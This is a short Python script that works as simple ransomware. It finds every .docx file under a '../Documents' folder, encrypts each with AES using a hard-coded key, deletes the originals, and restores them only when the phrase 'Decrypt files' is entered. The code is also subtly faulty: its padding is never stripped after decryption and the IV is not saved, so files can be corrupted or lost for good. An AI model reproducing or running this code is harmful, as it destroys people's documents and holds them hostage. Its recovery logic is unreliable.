from pathlib import Path
from Crypto.Cipher import AES
import os
from concurrent.futures import (
    ThreadPoolExecutor,
)

key = b"Sixteen byte key"
iv = os.urandom(16)


def encrypt(plain_text):
    padding = " " * (
        16 - len(plain_text) % 16
    )  # no padding in the og code, manually added
    plain_text += bytes(padding, "utf-8")

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(plain_text)


def decrypt(cipher_text):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(cipher_text)


def encryptFile(path):
    with open(str(path), "rb") as f:
        data = f.read()
    with open(f"{str(path)}.encrypted", "wb") as f:
        f.write(encrypt(data))
    os.remove(str(path))


def decryptFile(file_name):
    with open(f"{file_name}.encrypted", "rb") as f:
        data = f.read()
    with open(file_name, "wb") as f:
        f.write(decrypt(data))
    os.remove(f"{file_name}.encrypted")


def getFiles(directory, ext):
    paths = list(Path(directory).rglob(f"*{ext}"))
    return paths


directory = os.path.join(os.getcwd(), "../Documents")
ext = ".docx"
paths = getFiles(directory, ext)

with ThreadPoolExecutor() as executor:
    executor.map(encryptFile, paths)

while True:
    print("Enter decryption code: ")
    code = input().rstrip()
    if code == "Decrypt files":
        paths = getFiles(directory, ".docx.encrypted")
        file_names = [str(path).rstrip(".encrypted") for path in paths]
        with ThreadPoolExecutor() as executor:
            executor.map(decryptFile, file_names)
        break
